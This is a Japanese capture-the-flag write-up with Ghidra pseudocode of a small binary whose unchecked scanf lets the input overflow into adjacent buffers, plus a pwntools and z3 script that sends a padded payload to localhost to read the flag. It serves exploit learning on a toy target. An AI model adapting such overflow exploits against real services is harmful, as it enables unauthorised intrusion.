# challenge1

## description 

## solution
数字が３つ与えられるプログラム

ghidraによる擬似コードだとこんなふうになる
```
undefined8 main(void)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  time_t tVar7;
  size_t sVar8;
  FILE *__stream;
  long in_FS_OFFSET;
  int local_9c;
  char local_76 [10];
  char local_6c [10];
  char local_62 [10];
  char local_58 [56];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  tVar7 = time((time_t *)0x0);
  srand((uint)tVar7);
  iVar4 = rand();
  uVar1 = (iVar4 % 10000) * -2;
  iVar4 = rand();
  uVar2 = (iVar4 % 10000) * -2;
  iVar4 = rand();
  uVar3 = (iVar4 % 10000) * -2;
  puts("Can you cook my favourite food using these ingredients :)");
  printf("%d ; %d ; %d ;\n",(ulong)uVar1,(ulong)uVar2,(ulong)uVar3);
  __isoc99_scanf(&DAT_00100de2,local_76);
  local_9c = 0;
  do {
    sVar8 = strlen(local_76);
    if (sVar8 <= (ulong)(long)local_9c) {
      iVar4 = atoi(local_76);
      iVar5 = atoi(local_6c);
      iVar6 = atoi(local_62);
      if (uVar1 == iVar5 + iVar4) {
        if (uVar2 == iVar6 + iVar5) {
          if (uVar3 == iVar4 + iVar6) {
            __stream = fopen("flag.txt","r");
            if (__stream == (FILE *)0x0) {
              fwrite("\nflag.txt doesn\'t exist.\n",1,0x19,stderr);
                    /* WARNING: Subroutine does not return */
              exit(0);
            }
            fgets(local_58,0x32,__stream);
            printf("That\'s yummy.... Here is your gift:\n%s",local_58);
          }
          else {
            fail();
          }
        }
        else {
          fail();
        }
      }
      else {
        fail();
      }
LAB_00100ccd:
      if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    if (((local_76[local_9c] < '0') || ('9' < local_76[local_9c])) && (local_76[local_9c] != '-')) {
      puts("Invalid input :( ");
      goto LAB_00100ccd;
    }
    local_9c = local_9c + 1;
  } while( true );
}
```
local76に対しての入力で、特にチェックしていないのでバッファオーバーフローの脆弱性があることがわかる。
その脆弱性により、local6cとlocal62を書き換えることが出来る。
疑似コードではそれらを数字に戻して比較に使っているので、それらをz3にぶち込んでうまいことすると入力する文字列が導き出せる
ちなみにatoiでは数字以外の文字が来るとその時点で変換を終了するので適当な文字列をそれに追加してあげる

### solveコード
```

from pwn import *
import sys
from z3 import *

io = remote('localhost',4077)
io.recvline()
var1 = int(io.recvuntil(' ;').rstrip(b';'))
var2 = int(io.recvuntil(' ;').rstrip(b';'))
var3 = int(io.recvuntil(' ;').rstrip(b';')) 

log.info("{} {} {}".format(var1,var2,var3))
ivar4,ivar5,ivar6 = Ints('ivar4 ivar5 ivar6')
x = [var1,var2,var3]
solver = Solver()
solver.add(ivar5+ivar4 == x[0],ivar6+ivar5 == x[1],ivar4+ivar6==x[2])
solver.check()
m = solver.model()
log.info('{} {} {}'.format(m[ivar4],m[ivar5],m[ivar6]))

payload = ""
payload += str(m[ivar4])+(10-len(str(m[ivar4])))*'-'
payload += str(m[ivar5])+(10-len(str(m[ivar5])))*'-' 
payload += str(m[ivar6])+(10-len(str(m[ivar6])))*'-' 

log.info('payload = {}'.format(payload))
io.sendline(payload)
io.interactive()

```